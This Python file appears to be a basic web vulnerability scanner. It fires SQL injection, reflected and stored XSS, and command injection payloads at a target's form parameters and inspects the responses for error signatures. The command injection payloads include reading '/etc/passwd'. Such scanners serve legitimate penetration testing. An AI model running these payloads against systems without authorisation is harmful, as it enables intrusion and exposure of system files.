import requests

# -------------------------------
# SQL Injection
# -------------------------------
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "'; --",
    "' OR 1=1 --",
]
SQLI_ERROR_SIGNATURES = [
    "SQL syntax", "mysql_fetch", "syntax error",
    "Warning: mysql", "Unclosed quotation mark",
    "You have an error in your SQL syntax;"
]

def check_sqli(url, params, method='get', session=None):
    if session is None:
        session = requests

    for payload in SQLI_PAYLOADS:
        test_params = {k: payload for k in params}
        if method == 'post':
            r = session.post(url, data=test_params)
        else:
            r = session.get(url, params=test_params)

        # Check for known SQL error messages
        for sig in SQLI_ERROR_SIGNATURES:
            if sig.lower() in r.text.lower():
                print(f"[!] Possible SQL Injection at {url} with payload '{payload}'")
                return payload  # Return payload if vulnerability is detected
    return False

# -------------------------------
# Cross-Site Scripting (XSS)
# -------------------------------
XSS_PAYLOAD = "<script>alert('XSS')</script>"

def check_xss(url, params, method='get', session=None):
    if session is None:
        session = requests

    test_params = {k: XSS_PAYLOAD for k in params}
    if method == 'post':
        r = session.post(url, data=test_params)
    else:
        r = session.get(url, params=test_params)

    if XSS_PAYLOAD in r.text:
        print(f"[!] Possible XSS at {url} with payload '{XSS_PAYLOAD}'")
        return XSS_PAYLOAD
    return False

# -------------------------------
# Command Injection
# -------------------------------
CMD_INJECTION_PAYLOADS = [
    "; ls",
    "&& ls",
    "| ls",
    "; cat /etc/passwd",
    "&& cat /etc/passwd",
]
CMD_INJECTION_SIGNATURES = [
    "root:x:0:0",      # typical in /etc/passwd
    "daemon:",
    "bin/bash",
    "Windows IP Configuration",
]

def check_cmd_injection(url, params, method='get', session=None):
    if session is None:
        session = requests

    for payload in CMD_INJECTION_PAYLOADS:
        test_params = {k: payload for k in params}
        if method == 'post':
            resp = session.post(url, data=test_params)
        else:
            resp = session.get(url, params=test_params)

        for sig in CMD_INJECTION_SIGNATURES:
            if sig.lower() in resp.text.lower():
                print(f"[!] Possible Command Injection at {url} with payload '{payload}'")
                return payload
    return False

# -------------------------------
# Stored XSS
# -------------------------------
STORED_XSS_PAYLOAD = "<script>alert('Stored XSS')</script>"

def check_stored_xss_submit(url, form_params, session=None):
    """
    1) Submits the STORED_XSS_PAYLOAD using form_params
    2) Re-fetches the page to see if payload is present in the response
    """
    if session is None:
        session = requests.Session()

    # Add the XSS payload to the form parameters
    form_params.update({"comment": STORED_XSS_PAYLOAD})
    # Submit the payload
    submission = session.post(url, data=form_params)
    # Re-fetch the page
    result = session.get(url)
    if STORED_XSS_PAYLOAD in result.text:
        print(f"[!] Possible Stored XSS at {url} (payload found after submission)")
        return STORED_XSS_PAYLOAD
    return False

if __name__ == "__main__":
    # Example usage:
    url = "http://example.com/vulnerabilities/xss_s/"
    form_params = {
        "txtName": "test",
        "mtComment": "test",
        "token": "example_token"
    }
    if check_stored_xss_submit(url, form_params):
        print("Stored XSS vulnerability detected!")
    else:
        print("No Stored XSS vulnerability detected.")
